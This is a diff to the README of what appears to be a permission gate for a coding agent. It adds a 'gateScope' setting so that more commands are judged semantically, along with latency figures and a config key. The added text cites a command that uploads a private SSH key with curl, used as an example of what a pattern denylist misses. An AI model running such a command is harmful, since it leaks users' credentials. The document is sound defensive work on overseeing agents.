@@ -23,11 +23,26 @@ The gate has two layers, in this order:
 ```
 hard-deny               → block (never reaches Jev)
 your deny pattern       → block
-your allow pattern      → allow
-safe read-only command  → run, no record
+your allow pattern      → allow (recorded)
+your safeCommands       → run, no record
+dangerous pattern match → Jev (even when the command looks read-only)
+read-only builtin       → run, no record
 in-project write/edit   → run, no record
 everything else         → Jev: allow · block · block-if-undecidable
 ```
+
+**`gateScope` decides how far the semantic layer reaches, and the default is `all`.** A denylist
+can only recognise the shapes someone wrote a pattern for first: a command that uploaded a file
+(`curl -d @~/.ssh/id_ed25519 ...`) matched nothing and ran with no judgment at all. Under `all`
+the deterministic layer names what it can vouch for — read-only inspection, your declared safe
+commands, a write inside the project to an unprotected path — and everything else is judged.
+`matched` restores the old pattern-only behaviour. `/jev-auto-mode scope all|matched` changes it.
+
+The trade is latency: a judged call costs roughly half a second (measured median 503 ms, max
+593 ms over eleven commands), while a fast-path call costs nothing. Read-only inspection is
+therefore a real allowlist rather than a convenience. The other side of the trade is intent: a
+call the user did not ask for has to be clear enough to pass the intent question, so an
+incidental `mv`, `cp`, or `chmod` the request never mentioned is blocked rather than assumed.
 
 `rm -rf build` inside the repository is recognized as a scoped local deletion. A write to
 `.env`, `.git/`, `~/.ssh`, `.pi/`, `.github/workflows/`, or `AGENTS.md` is escalated even when
@@ -93,6 +108,7 @@ Packages are discovered in the [package gallery](https://pi.dev/packages) throug
 /jev-auto-mode threshold reset [rule]   restore the calibrated default
 /jev-auto-mode uncertain                show what the middle band resolves to
 /jev-auto-mode uncertain deny|ask|allow
+/jev-auto-mode scope all|matched        how far the semantic layer reaches
 ```
 
 ```
@@ -173,6 +189,7 @@ Policy notes: `$PI_CODING_AGENT_DIR/jev-auto-mode-policy.md`.
   "extraProtectedPaths": [],
   "maxStateCharacters": 120000,
   "uncertain": "deny",
+  "gateScope": "all",
   "thresholds": {}
 }
 ```
